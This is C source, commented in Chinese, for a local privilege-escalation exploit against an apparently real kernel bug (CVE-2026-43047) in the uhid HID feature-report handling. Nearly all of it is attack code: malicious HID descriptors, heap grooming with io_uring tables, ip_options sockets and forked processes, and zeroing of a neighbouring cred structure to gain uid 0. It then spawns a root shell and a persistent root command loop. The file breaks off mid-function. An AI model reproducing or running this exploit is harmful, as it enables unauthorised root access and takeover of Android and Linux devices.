﻿/* dev_pwn.c — CVE-2026-43047 利用探针: kmalloc-192 整形 + 跨页 cred 零化
 *
 * 账目 (§34.2):
 *   report2 data = 130B (pad=128) -> rsize=131 -> kzalloc(138) -> kmalloc-192
 *   report3 data = 4095B -> expected=min(4096,4095)=4095 -> w24 = 4095-130 = 3965
 *   memset(buf+131, 0, 3965) = 本 slot 尾 7B + 后续 ~20 个 192B 对象
 *
 * mode 1: canary (REG_FILES nr=24 喷射, 零化后 fd->0 => READV(/dev/null)=0)
 * mode 2: canary + fork cred 喷射 + getuid()==0 oracle
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/eventfd.h>
#include <linux/filter.h>
#include <linux/uhid.h>
#include <poll.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/mount.h>
#include <sys/xattr.h>
#include <signal.h>
#include <linux/sched.h>

#define EVSZ 4380
static unsigned char ev[EVSZ];
static void wr32(int o, uint32_t v){ memcpy(ev+o,&v,4); }
static void wr16(int o, uint16_t v){ memcpy(ev+o,&v,2); }
static uint32_t rd32(int o){ uint32_t v; memcpy(&v,ev+o,4); return v; }

/* ---------------- descriptor ---------------- */
static unsigned char desc[8192];
static unsigned desc_len;

static const unsigned char wptp[] = {
0x05,0x0D,0x09,0x05,0xA1,0x01,
    0x85,0x01,
    0x09,0x56,0x24,0x00,0x26,0xFF,0xFF,0x75,0x10,0x95,0x01,0x81,0x02,
    0x09,0x54,0x25,0x05,0x75,0x08,0x81,0x02,
    0x05,0x20,0x0A,0x94,0x04,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
    0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
    0x05,0x0D,0x09,0x22,0xA1,0x02,
        0x09,0x51,0x25,0x0F,0x75,0x04,0x95,0x01,0x81,0x02,
        0x09,0x42,0x25,0x01,0x75,0x01,0x81,0x02,
        0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,
        0x05,0x01,0x09,0x30,0x15,0x00,0x26,0xC8,0x00,0x35,0x00,
        0x45,0x69,0x65,0x11,0x75,0x10,0x95,0x01,0x81,0x02,
        0x09,0x31,0x26,0x96,0x00,0x45,0x4B,0x81,0x02,
        0x05,0x0D,0x09,0x30,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
        0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
    0xC0,
    0x05,0x09,0x09,0x01,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,
    0x81,0x02,0x95,0x07,0x81,0x03,
    0x85,0x02,
    0x05,0x0D,0x09,0x55,0x25,0x05,0x75,0x08,0x95,0x01,0xB1,0x02,
    0x09,0x59,0x25,0x02,0xB1,0x02,
    0x85,0x40,
    0x05,0x0D,0x09,0xB0,0x15,0x01,0x25,0x03,0x35,0x6E,0x45,0xBE,
    0x65,0x12,0x75,0x02,0x95,0x01,0xB1,0x02,
    0x85,0x41,
    0x05,0x0E,0x09,0x01,0xA1,0x02,
        0x09,0x23,0x15,0x00,0x25,0x04,0x75,0x08,0x95,0x01,0xB1,0x02,
    0xC0,
0xC0,
};

/* pad_n: report2 的 const 填充字节数; rep3_data: report3 数据字节数 */
static void build_desc(int pad_n, int rep3_data) {
    int pos=0, i=0, insA=-1;
    while(i<(int)sizeof(wptp)-5){
        if(wptp[i]==0x09&&wptp[i+1]==0x59&&wptp[i+2]==0x25&&wptp[i+3]==0x02
           &&wptp[i+4]==0xB1&&wptp[i+5]==0x02){insA=i+6;break;}
        i++;
    }
    memcpy(desc+pos,wptp,insA); pos+=insA;
    /* pad: 75 08 | 95 <lo> <hi>(B1 03) xN — 每段 255 字节 */
    int rem = pad_n;
    while (rem > 0) {
        int chunk = rem > 255 ? 255 : rem;
        desc[pos++]=0x75; desc[pos++]=0x08;
        desc[pos++]=0x95; desc[pos++]=chunk&0xFF; desc[pos++]=(chunk>>8)&0xFF;
        desc[pos++]=0xB1; desc[pos++]=0x03;
        rem -= chunk;
    }
    /* report3 */
    desc[pos++]=0x85; desc[pos++]=0x03;
    rem = rep3_data;
    while (rem > 0) {
        int chunk = rem > 255 ? 255 : rem;
        desc[pos++]=0x75; desc[pos++]=0x08;
        desc[pos++]=0x95; desc[pos++]=chunk&0xFF; desc[pos++]=(chunk>>8)&0xFF;
        desc[pos++]=0xB1; desc[pos++]=0x03;
        rem -= chunk;
    }
    memcpy(desc+pos,wptp+insA,sizeof(wptp)-insA); pos+=sizeof(wptp)-insA;
    desc_len = pos;
}

/* ---------------- io_uring engine (cz6 验证过的) ---------------- */
static long sys_setup(unsigned n, void*p){ return syscall(425,n,p); }
static long sys_reg(unsigned fd,unsigned op,void*a,unsigned n){ return syscall(427,fd,op,a,n); }
static long sys_enter(unsigned fd,unsigned s,unsigned m,unsigned f,void*x){ return syscall(426,fd,s,m,f,x); }

struct uctx {
    int fd;
    volatile uint32_t *sq_tail,*cq_head,*cq_tail;
    uint32_t sq_mask,cq_mask;
    uint32_t *sq_array;
    unsigned char *sqe;
    struct { uint64_t ud; int32_t res; uint32_t fl; } *cqes;
};
#define MAXARR 30000
static struct uctx U[MAXARR];
static char skipped[MAXARR];
static int efd_base[24];      /* 24 个共享 eventfd (所有 ring 复用) */
static int efd_made = 0;

static int g_nr = 24;   /* 每表注册数: 24 -> 192B, 16 -> 128B */
static int new_arr(int slot){
    struct { uint32_t se,ce,f,sc,si,fe; uint32_t rv[4];
        struct { uint32_t h,t,m,e,f,d,a,r1; uint64_t r2; } so;
        struct { uint32_t h,t,m,e,ov,cq; uint64_t rv[2]; } co;
    } p; memset(&p,0,sizeof p);
    long fd = sys_setup(4,&p);
    if(fd<0){ if(slot==0) printf("setup fail errno=%d\n", errno); return -1; }
    struct uctx *u = &U[slot]; memset(u,0,sizeof *u); u->fd = fd;
    int single = (p.f & 1);   /* IORING_FEAT_SINGLE_MMAP */
    unsigned char *sq = mmap(NULL, p.co.cq+16*p.ce > p.so.a+4*p.se ? p.co.cq+16*p.ce : p.so.a+4*p.se,
                             PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0);
    unsigned char *cq = single ? sq : mmap(NULL, p.co.cq+16*p.ce, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x8000000ULL);
    unsigned char *se = mmap(NULL, 4*p.se*64, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE, fd, 0x10000000ULL);
    if(sq==MAP_FAILED||cq==MAP_FAILED||se==MAP_FAILED){ if(slot==0) printf("mmap fail errno=%d\n", errno); return -2; }
    u->sq_tail=(uint32_t*)(sq+p.so.t); u->sq_array=(uint32_t*)(sq+p.so.a);
    u->sq_mask=*(uint32_t*)(sq+p.so.m);
    u->cq_head=(uint32_t*)(cq+p.co.h); u->cq_tail=(uint32_t*)(cq+p.co.t);
    u->cq_mask=*(uint32_t*)(cq+p.co.m);
    u->cqes=(void*)(cq+p.co.cq); u->sqe=se;
    if(!efd_made){
        for(int j=0;j<g_nr;j++){
            efd_base[j] = eventfd(1, EFD_NONBLOCK);
            if (efd_base[j] < 0){ printf("eventfd fail j=%d\n", j); return -3; }
        }
        efd_made = 1;
    }
    /* 每个 ring 注册同一组 eventfd => 分配一个 kcalloc(g_nr*8) 指针表 */
    if(sys_reg(fd,2,efd_base,g_nr)!=0){ if(slot==0) printf("reg fail errno=%d\n", errno); return -3; }
    return slot;
}
static void free_arr(int slot){
    if(U[slot].fd>0){ sys_reg(U[slot].fd,3,NULL,0); close(U[slot].fd); U[slot].fd=-1; }
}

static char iovbuf[64];
static struct { void *base; size_t len; } iov = { iovbuf, 64 };
static void poke(void){ uint64_t one=1; write(efd_base[0], &one, 8); }
static int do_readv(int slot){
    struct uctx *u = &U[slot];
    if(u->fd<=0) return -1000;
    struct { uint8_t op,fl; uint16_t io; int32_t fd; uint64_t off,addr;
             uint32_t len,rf; uint64_t ud; uint16_t bi; uint8_t p[6]; uint64_t p2[3]; } *e;
    uint32_t t = *u->sq_tail;
    e = (void*)(u->sqe + (t & u->sq_mask)*64);
    memset(e,0,64);
    e->op=1; e->fl=1; e->fd=0; e->addr=(uint64_t)(uintptr_t)&iov; e->len=1; e->ud=0x99;
    u->sq_array[t&u->sq_mask]=t&u->sq_mask; *u->sq_tail=t+1;
    long r = sys_enter(u->fd,1,1,1,NULL);
    if(r<0) return -2000-(int)errno;
    for(int k=0;k<50;k++){
        if(*u->cq_tail > *u->cq_head){
            uint32_t ch=*u->cq_head;
            int res=u->cqes[ch&u->cq_mask].res;
            *u->cq_head=ch+1;
            return res;
        }
        sys_enter(u->fd,0,1,1,NULL);
        usleep(2000);
    }
    return -3000;
}

/* ---------------- add_key 密集喷射 (kmalloc-192: rcu16+datalen2+data160=178) ---------------- */
static long sys_addkey(const char *desc, void *pay, int plen){
    return syscall(217, "user", desc, pay, plen, -2); /* KEY_SPEC_PROCESS_KEYRING */
}
static long sys_keyctl_read(int id, void *buf, int len){
    return syscall(219, 3, id, buf, len); /* KEYCTL_READ */
}
static int keyctl_setup(void){
    /* 确保进程 keyring 存在: KEYCTL_GET_KEYRING_ID(KEY_SPEC_PROCESS_KEYRING, create=1) */
    long r = syscall(219, 0, -2, 1);
    return r < 0 ? -1 : 0;
}

/* ---------------- uhid trigger ---------------- */
static double now_s(void){ struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); return ts.tv_sec+ts.tv_nsec/1e9; }
static long long nowns(void){ struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); return ts.tv_sec*1000000000LL+ts.tv_nsec; }

static int ufd;
/* bionic/内核标准布局应答 (与 dev_oob 一致, 已实测触发 memset) */
static int trigger_once(void){
    struct uhid_event ea;
    memset(&ea,0,sizeof(ea));
    ea.type = UHID_CREATE;
    strcpy((char*)ea.u.create.name,"pw");
    strcpy((char*)ea.u.create.phys,"virt-0");
    strcpy((char*)ea.u.create.uniq,"p0");
    ea.u.create.rd_data = (void*)(uintptr_t)desc;
    ea.u.create.rd_size = desc_len;
    ea.u.create.bus = 0x0003;
    ea.u.create.vendor = 0x1234;
    ea.u.create.product = 0x5678;
    ea.u.create.version = 1;
    ea.u.create.country = 0;
    if (write(ufd,&ea,sizeof(ea))<=0) return -1;

    int answered=0;
    int oob_done=0;   /* 每轮只做一次 oob: 第二次 memset 落点不可控, 会零化 freelist => 必崩 */
    for(int t=0;t<300 && answered<3;t++){
        struct pollfd pfd1 = { ufd, POLLIN, 0 };
        if(poll(&pfd1,1,20)<=0) continue;
        ssize_t rn=read(ufd,&ea,sizeof(ea));
        if(rn<=0) continue;
        if(ea.type==UHID_START) continue;
        if(ea.type==UHID_OPEN||ea.type==UHID_CLOSE) continue;
        if(ea.type==9||ea.type==13){
            int oob = (!oob_done && ((uint8_t*)&ea.u)[4]==2);
            struct uhid_event an;
            memset(&an,0,sizeof(an));
            an.type = 10;
            an.u.feature_answer.id = ea.u.feature.id;
            an.u.feature_answer.err = 0;
            an.u.feature_answer.size = oob ? 128 : 1;
            an.u.feature_answer.data[0] = oob ? 3 : 0;
            write(ufd,&an,sizeof(an));
            if(oob){ answered++; oob_done=1; printf("OOB-SENT\n"); }
        }
    }
    /* 等待 worker 完成 memset (poll, 避免 FD_SETSIZE 限制) */
    for(int t=0;t<100;t++){
        struct pollfd pfd1 = { ufd, POLLIN, 0 };
        if(poll(&pfd1,1,20)<=0) continue;
        if(read(ufd,&ea,sizeof(ea))<=0) continue;
        if(ea.type==9||ea.type==13){
            struct uhid_event an;
            memset(&an,0,sizeof(an));
            an.type=10;
            an.u.feature_answer.id=ea.u.feature.id;
            an.u.feature_answer.size=1;
            write(ufd,&an,sizeof(an));
        }
    }
    memset(&ea,0,sizeof(ea));
    ea.type=UHID_DESTROY;
    write(ufd,&ea,sizeof(ea));
    return answered;
}

/* kmalloc-128 slabinfo: 返回 active_objs 与 num_objs (探测页耗尽用) */
static int (*g_spray_one)(void) = NULL;   /* mode 5: 喷一个 ip_options */
static int g_measure = 0;                 /* 测量模式: 跳过 grooming/洞, 纯净测 m0/m' */
static int g_sfd[16384];
static int g_ns = 0;
static unsigned char g_opt[40];
static int g_slabfd = -1;   /* bootstrap(root) 预打开 /proc/slabinfo, 降权后仍可读 */

static int spray_one_impl(void){
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s<0) return -1;
    if(setsockopt(s, IPPROTO_IP, IP_OPTIONS, g_opt, sizeof g_opt)<0){ close(s); return -1; }
    if(g_ns<(int)(sizeof(g_sfd)/sizeof(g_sfd[0]))) g_sfd[g_ns++]=s;
    return s;
}

/* mode 6 子进程: 轮询 uid0 → root 守护 (绝不 fork — usage=0 的 cred; exec 安全)
   ⚠ bionic 把 uid 缓存在 TLS: CLONE_VM 子沿用父 TLS → getuid() 恒为缓存值!
   必须用裸 syscall 读内核真实 cred */
static const char *g_rootcmd;
static volatile const int *g_pipefd;
static int mode6_child(void *arg){
    (void)arg;
    for(int q=0;q<7200;q++){
        if(syscall(174)==0){   /* __NR_getuid (arm64) — 绕过 bionic TLS 缓存 */
            setsid();
            write(g_pipefd[1],"1",1);
            signal(SIGPIPE, SIG_IGN);
            write(g_pipefd[1],"2",1);
            execl("/system/bin/sh","sh","-c",g_rootcmd,(char*)NULL);
            write(g_pipefd[1],"E",1);
            _exit(3);
        }
        usleep(500000);
    }
    _exit(0);
}

/* kmalloc-128 slabinfo: 返回 active_objs 与 num_objs (探测页耗尽用) */
static int slab128(int *num_out){
    char l[512]; int act=-1, num=-1;
    int found = 0;
    char big[16384];
    if(g_slabfd >= 0){
        lseek(g_slabfd, 0, SEEK_SET);
        int n = read(g_slabfd, big, sizeof big - 1);
        if(n > 0){ big[n] = 0;
            char *p = strstr(big, "kmalloc-128 ");
            if(p && sscanf(p+12, "%d %d", &act, &num) == 2) found = 1;
        }
    }
    if(!found){
        FILE *f = fopen("/proc/slabinfo","r");
        if(!f) return -1;
        while(fgets(l,sizeof l,f)){
            char *p = strstr(l,"kmalloc-128 ");
            if(p){
                if(sscanf(p+12,"%d %d",&act,&num)!=2){ act=-1; }
                break;
            }
        }
        fclose(f);
    }
    if(num_out) *num_out = num;
    return act;
}

/* mode 5 专用: OOB 用第 2 次 GET_REPORT(id2) 的 buf#2。
   buf#k 在内核发事件#k 之前就已分配; 收到#1 时 buf#1 已定而 buf#2 未分配。
   此刻 (内核阻塞等应答, 单 worker, 无竞争分配):
     1. grooming: 逐个喷 socket, /proc/slabinfo num_objs 跳变 = SLUB 取新页,
        再补 31 个灌满 → 当前 kmalloc-128 页 FULL
     2. close K 个跨页分散的洞 → 250ms rcu → 洞页(每页恰 1 洞)进 per-cpu partial 链
     3. 应答#1(无害) → 探测的 m' 个分配逐个 pop 洞页 → buf#2 = 洞 (页内唯一空位)
        → 邻居 31/32 是已分配 ip_options → memset 零化邻居[0..25) → optlen=0 可检测
        且不碰 freepointer@0 → 不崩
     4. 应答#2 = OOB → memset 触发 */
static int trigger_oob2(const int *victims, int K, int *hole_done){
    struct uhid_event ea;
    memset(&ea,0,sizeof(ea));
    ea.type = UHID_CREATE;
    strcpy((char*)ea.u.create.name,"pw");
    strcpy((char*)ea.u.create.phys,"virt-0");
    strcpy((char*)ea.u.create.uniq,"p0");
    ea.u.create.rd_data = (void*)(uintptr_t)desc;
    ea.u.create.rd_size = desc_len;
    ea.u.create.bus = 0x0003;
    ea.u.create.vendor = 0x1234;
    ea.u.create.product = 0x5678;
    ea.u.create.version = 1;
    ea.u.create.country = 0;
    if (write(ufd,&ea,sizeof(ea))<=0) return -1;

    int answered=0, seq2=0, oob_done=0;
    for(int t=0;t<400 && answered<3;t++){
        struct pollfd pfd1 = { ufd, POLLIN, 0 };
        if(poll(&pfd1,1,20)<=0) continue;
        ssize_t rn=read(ufd,&ea,sizeof(ea));
        if(rn<=0) continue;
        if(ea.type==UHID_START||ea.type==UHID_OPEN||ea.type==UHID_CLOSE) continue;
        if(ea.type==9||ea.type==13){
            int is_get2 = (ea.type==9 && ((uint8_t*)&ea.u)[4]==2);
            if(is_get2){ seq2++; printf("[get2 #%d] act=%d\n", seq2, slab128(NULL)); }
            if(is_get2 && seq2==1 && !*hole_done && !g_measure){
                /* 1. grooming: 灌满当前页 (num_objs 跳变 = 新页, 再补 31) */
                if(g_spray_one){
                    int num_prev = -1, act = slab128(&num_prev);
                    int done = 0;
                    for(int k=0;k<256 && !done;k++){
                        int newnum = -1;
                        g_spray_one();
                        act = slab128(&newnum);
                        if(newnum > num_prev){
                            /* 新页已取 (本 alloc 占 1 槽), 补 31 灌满 */
                            for(int q=0;q<31;q++) g_spray_one();
                            done = 1;
                        }
                        num_prev = newnum;
                    }
                    printf("[groom] done=%d act=%d\n", done, act);
                }
                /* 2. 洞 + rcu */
                for(int j=0;j<K;j++) close(victims[j]);
                *hole_done=1;
                usleep(250000);   /* rcu 宽限期: ip_options_rcu kfree → 洞页进 partial 链 */
            }
            int oob = (is_get2 && seq2==2 && !oob_done);
            struct uhid_event an;
            memset(&an,0,sizeof(an));
            an.type = 10;
            an.u.feature_answer.id = ea.u.feature.id;
            an.u.feature_answer.err = 0;
            an.u.feature_answer.size = oob ? 128 : 1;
            an.u.feature_answer.data[0] = oob ? 3 : 0;
            write(ufd,&an,sizeof(an));
            if(oob){ oob_done=1; printf("OOB-SENT\n"); }
            answered++;
        }
    }
    for(int t=0;t<100;t++){
        struct pollfd pfd1 = { ufd, POLLIN, 0 };
        if(poll(&pfd1,1,20)<=0) continue;
        if(read(ufd,&ea,sizeof(ea))<=0) continue;
        if(ea.type==9||ea.type==13){
            struct uhid_event an;
            memset(&an,0,sizeof(an));
            an.type=10;
            an.u.feature_answer.id=ea.u.feature.id;
            an.u.feature_answer.size=1;
            write(ufd,&an,sizeof(an));
        }
    }
    memset(&ea,0,sizeof(ea));
    ea.type=UHID_DESTROY;
    write(ufd,&ea,sizeof(ea));
    return answered;
}

int main(int argc, char **argv){
    setvbuf(stdout,NULL,_IONBF,0);
#ifdef QEMU_INIT
    /* mode 6: cred 跨页零化 — rep3=191 → w24 = 71 = 7(F2 尾) + 64(cred[0..0x40)) */
    int mode=6, narr=0, nrnd=1, rep3_data=191, pad_n=118;   /* nrnd=1: round2+ 状态漂移=崩溃轮盘 */
    g_nr=24;
    int g_t0=51;   /* QEMU: v8 实测 slot26 (f=20+warmup漂移) → T0=46+5 */
#else
    int mode = argc>1 ? atoi(argv[1]) : 1;   /* 1=arrays 2=cred 3=keys 5=ip_opts 6=cred-pg */
    int narr  = argc>2 ? atoi(argv[2]) : 32;
    int nrnd  = argc>3 ? atoi(argv[3]) : 8;
    int rep3_data = argc>4 ? atoi(argv[4]) : 4095;
    int pad_n     = argc>5 ? atoi(argv[5]) : 128;
    g_nr          = argc>6 ? atoi(argv[6]) : 24;
    int g_t0      = argc>7 ? atoi(argv[7]) : 42;   /* mode6: CREATE 前预 groom 数 */
    /* 扫描法: buf#1=F2末槽 ⟺ (T0−f+5)≡31 (mod 32), f=页面起始空位(设备未知, 扫描) */
#endif

    /* QEMU init 引导: uid==0 且无 /proc => 挂载 + 建 uhid 节点 */
    if (getuid()==0 && access("/proc/devices", F_OK)<0) {
        mkdir("/proc",0755); mount("proc","/proc","proc",0,NULL);
        mkdir("/sys",0755);  mount("sysfs","/sys","sysfs",0,NULL);
        mkdir("/dev",0755);  mount("devtmpfs","/dev","devtmpfs",0,NULL);
        mkdir("/data",0755); mount("tmpfs","/data","tmpfs",0,NULL);
        mkdir("/data/local",0755); mkdir("/data/local/tmp",0755);
        int minor=-1; char l[128];
        FILE *f=fopen("/proc/misc","r");
        if(f){ while(fgets(l,sizeof l,f)) if(strstr(l,"uhid")){ minor=atoi(l); break; } fclose(f); }
        printf("uhid misc minor=%d\n", minor);
        if(minor>=0) mknod("/dev/uhid", S_IFCHR|0666, makedev(10,minor));
        chmod("/data/local/tmp", 0777);
        chmod("/dev/uhid", 0666);
        int d = open("/dev/console",O_RDWR); dup2(d,0); dup2(d,1); dup2(d,2); if(d>2) close(d);
        /* root 时预开 slabinfo (权限在 open 时检查), 降权后仍可 pread */
        g_slabfd = open("/proc/slabinfo", O_RDONLY);
        /* 降权: QEMU init 天生 uid0, 不降权则 getuid()==0 恒真 (假 PWNED) */
        setgid(1000); setuid(1000);
        printf("dropped to uid=%d gid=%d slabfd=%d\n", getuid(), getgid(), g_slabfd);
    }

    build_desc(pad_n, rep3_data);
    printf("desc_len=%u pad=%d rep3=%d nr=%d (rsize=%d, w24=%d)\n", desc_len, pad_n, rep3_data, g_nr, pad_n+3, rep3_data-pad_n-2);
    printf("uid=%d\n", getuid());

    { cpu_set_t s; CPU_ZERO(&s); CPU_SET(2,&s); sched_setaffinity(0,sizeof(s),&s); }
    { int n = open("/dev/null",O_RDWR); dup2(n,0); if(n>0) close(n); }
    /* 提升 fd 上限: 密集喷射需要 >1024 fds */
    { struct rlimit rl; getrlimit(RLIMIT_NOFILE,&rl);
      printf("nofile soft=%d hard=%d\n",(int)rl.rlim_cur,(int)rl.rlim_max);
      rl.rlim_cur = rl.rlim_max;
      setrlimit(RLIMIT_NOFILE,&rl); }

    int nchild = 0;
    int pfd[2];
    (void)nchild; (void)pfd;

    /* mode 2: cred 跨页零化 — 每轮独立小爆炸:
       [21 表(新页Pt)] → [21 fork(新页Pc, buddy 紧随 Pt)] → free Pt 中 1 表(洞)
       → 25ms rcu → 触发(w24=509: 洞尾61+slot19/20=384+cred[0..0x40)=64) */
    if (mode==2){
        int pfd[2];
        if(pipe(pfd)<0) return 1;
        /* 注意: 不要在 fork 前 close(pfd[1]) — 子进程要靠它发信号
           (此前 close 在 fork 前 => EOF 假 PWNED) */
        ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
        if(ufd<0){ printf("uhid open: %s\n", strerror(errno)); return 1; }
        int xf = open("/data/local/tmp/pwn_f", O_RDWR|O_CREAT, 0600);
        if (xf>=0) close(xf);
        /* 预建 0666 通道文件 (uid0 子进程 gid=0 => 只有 other 权限) */
        { int a1 = creat("/data/local/tmp/.rootok", 0666); if(a1>=0) close(a1);
          int a2 = creat("/data/local/tmp/.out", 0666); if(a2>=0) close(a2);
          chmod("/data/local/tmp/.rootok", 0666); chmod("/data/local/tmp/.out", 0666); }
        int cnt=0, nchild=0;
        /* 预热: 灌满 memcg/系统的部分页, 使后续 21-alloc/21-fork 恰好各触发一页新页 */
        for(int k=0;k<150;k++) if(new_arr(cnt)>=0 && cnt<MAXARR-2) cnt++;
        for(int k=0;k<400;k++){
            pid_t pid=fork();
            if(pid==0){
                for(int q=0;q<7200;q++){ if(getuid()==0){ write(pfd[1],"W",1); while(1) pause(); } usleep(500000); }
                _exit(0);
            }
            if(pid>0) nchild++;
        }
        printf("[%.3f] warmup: %d tables, %d children\n", now_s(), cnt, nchild);
        for(int r=1; r<=nrnd; r++){
            /* 爆发: 21 表(新页) + 21 fork(cred 页紧随) — 预热后每批恰好各 1 新页 */
            int base = cnt;
            for(int k=0;k<21;k++) if(new_arr(cnt)>=0 && cnt<MAXARR-2) cnt++;
            for(int k=0;k<21;k++){
                pid_t pid=fork();
                if(pid==0){
                    for(int q=0;q<7200;q++){
                        if(getuid()==0){
                            /* uid0: 立即 exec sh 守护循环 (exec 换发新 cred=稳定;
                               之后绝不能 fork — usage=0 的旧 cred 会被误释放) */
                            static const char *rootcmd =
                                "echo uid0 > /data/local/tmp/.rootok;"
                                "while true; do"
                                " if [ -f /data/local/tmp/.cmd ]; then"
                                "  sh /data/local/tmp/.cmd > /data/local/tmp/.out 2>&1;"
                                "  rm -f /data/local/tmp/.cmd;"
                                " fi; sleep 0.3; done";
                            setsid();
                            write(pfd[1],"1",1);   /* setsid 完成 */
                            signal(SIGPIPE, SIG_IGN);
                            write(pfd[1],"2",1);   /* signal 完成 */
                            execl("/system/bin/sh","sh","-c",rootcmd,(char*)NULL);
                            /* execl 失败: 报告 errno */
                            write(pfd[1],"E",1);
                            int en = errno;
                            write(pfd[1],&en,sizeof en);
                            _exit(3);
                        }
                        usleep(500000);
                    }
                    _exit(0);
                }
                if(pid>0) nchild++;
            }
            /* 洞: 本批表的中间槽 (页满, 邻居全活跃) */
            int victim = base + 10;
            if(victim<cnt) { free_arr(victim); skipped[victim]=1; }
            usleep(120000);   /* rcu 宽限期 */
            int a = trigger_once();
            printf("[%.3f] round %d: a=%d (tables=%d children=%d)\n", now_s(), r, a, cnt, nchild);
            /* fork 子进程与父进程共享 cred => 零化后父进程自己就是 uid0! */
            if(getuid()==0){
                printf("★★★★★ ROOT: parent uid=0 — exec sh ★★★★★\n");
                fflush(stdout);
                execl("/system/bin/sh","sh",(char*)NULL);
                _exit(7);
            }
            struct pollfd p1 = { pfd[0], POLLIN, 0 };
            if(poll(&p1,1,100)>0){
                char cbuf[64]; memset(cbuf,0,sizeof cbuf);
                usleep(50000);
                int n = read(pfd[0], cbuf, sizeof cbuf - 1);
                if(n>0){
                    /* 打印诊断序列: P=uid0, 1=setsid, 2=signal, E=exec失败 */
                    printf("★★★★★ PWNED trace: ");
                    for(int i=0;i<n;i++) printf("%02x ", (unsigned char)cbuf[i]);
                    printf("| %s\n", cbuf);
                    while(1) pause();
                }
                /* n==0 = EOF(写端全关) = 假信号, 继续下一轮 */
            }
            usleep(200000);
        }
        printf("=== END no uid0 (holding) ===\n");
        while(1) pause();
        return 0;
    }

    if (mode==1){
        int cnt=0;
        for(int i=0;i<narr;i++) if(new_arr(cnt)>=0) cnt++;
        printf("[%.3f] sprayed: %d arrays\n", now_s(), cnt);
        int ok=0;
        for(int i=0;i<cnt;i++){ poke(); if(do_readv(i)==8) ok++; }
        printf("[%.3f] control: %d/%d healthy(8)\n", now_s(), ok, cnt);

        ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
        if(ufd<0){ printf("uhid open: %s\n", strerror(errno)); return 1; }
        int total_hits=0;
        for(int r=1; r<=nrnd; r++){
            /* 同步洞: setxattr kvmalloc(112)+kfree => kmalloc-128 洞 (与 nr=16 表同类!)
               必须匹配: xbuf 112B -> kmalloc-128; 176B -> kmalloc-192 */
            int xf = open("/data/local/tmp/pwn_f", O_RDWR|O_CREAT, 0600);
            if (xf>=0) close(xf);
            char xbuf[112]; memset(xbuf,'X',sizeof xbuf);
            setxattr("/data/local/tmp/pwn_f", "user.pwn", xbuf, sizeof xbuf, 0);
            int a = trigger_once();
            int hits=0;
            for(int i=0;i<cnt;i++){
                if(U[i].fd<=0||skipped[i]) continue;
                poke();
                int res=do_readv(i);
                if(res!=8){ hits++; if(hits<40) printf("  ★ slot%d res=%d!!\n", i, res); }
            }
            total_hits+=hits;
            printf("[%.3f] round %d: a=%d hits=%d total=%d\n", now_s(), r, a, hits, total_hits);
            usleep(300000);
        }
        printf("=== END total_hits=%d uid=%d ===\n", total_hits, getuid());
        if(total_hits>0){
            /* 命中后绝不退出: close ring 会 fput(NULL) panic */
            printf("PWN-STAGE1: holding...\n");
            while(1) pause();
        }
        return 2;
    }

    /* mode 5: ip_options 喷射 (kmalloc-128 root 缓存, 未被 accounting — §59)
       UDP socket + setsockopt(IP_OPTIONS, 40B NOP) → ip_options_get
       = kzalloc(72, GFP_KERNEL) → kmalloc-128 (无 kmalloc-96! lldb 实测 objsz=128,
       offset=0 = freepointer 在对象头)
       buf: pad=118 → rsize=121 → kzalloc(128) → kmalloc-128
       w24 = rep3-pad-2 = 152-118-2 = 32 = buf尾7 + 邻居[0..25)
       (rcu16 空闲无害 + faddr/nexthop + optlen@24 零化 → getsockopt 返 0 = 命中)
       canary: getsockopt(IP_OPTIONS) 健康=40×0x01; 命中=len=0
       洞策略: 喷射数取 32 的整数倍 (页满), 每轮在收到 GET_REPORT#1 后 (buf#2 未分配)
       close 8 个跨页分散的 socket + 250ms rcu → buf#2 = 页内唯一洞 → 邻居全已分配 */
    if (mode==5){
        unsigned char opt[40]; memset(opt,0x01,sizeof opt); /* IPOPT_NOP ×40 */
        memcpy(g_opt, opt, sizeof g_opt);
        /* 喷射数向下取整到 32 的倍数 (页满对齐, kmalloc-128 = 32 obj/页) */
        narr = (narr/32)*32;
        int ns=0;
        for(int i=0;i<narr;i++){
            int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(s<0){ printf("socket fail i=%d errno=%d\n", i, errno); break; }
            if(setsockopt(s, IPPROTO_IP, IP_OPTIONS, opt, sizeof opt)<0){
                printf("setsockopt fail i=%d errno=%d\n", i, errno); close(s); break;
            }
            if(ns<(int)(sizeof(g_sfd)/sizeof(g_sfd[0]))) g_sfd[ns++]=s;
        }
        g_ns = ns;
        printf("[%.3f] sprayed: %d ip_options\n", now_s(), ns);
        socklen_t rl; unsigned char rb[64];
        int ok=0;
        for(int i=0;i<ns;i++){
            rl=sizeof rb;
            if(getsockopt(g_sfd[i], IPPROTO_IP, IP_OPTIONS, rb, &rl)==0
               && rl==40 && rb[0]==0x01 && rb[39]==0x01) ok++;
        }
        printf("[%.3f] control: %d/%d healthy(40x01)\n", now_s(), ok, ns);
        { int n1=-1; int a1 = slab128(&n1); printf("[slab] after spray act=%d num=%d\n", a1, n1); }
        if(ok==0){ printf("!!! canary 失明: control 全异常, 喷射本身失败\n"); return 3; }

        ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
        if(ufd<0){ printf("uhid open: %s\n", strerror(errno)); return 1; }
        int total_hits=0;
        const int K = 48;
        int victims[48];
        int markidx[48];
        int hole_done = 0;
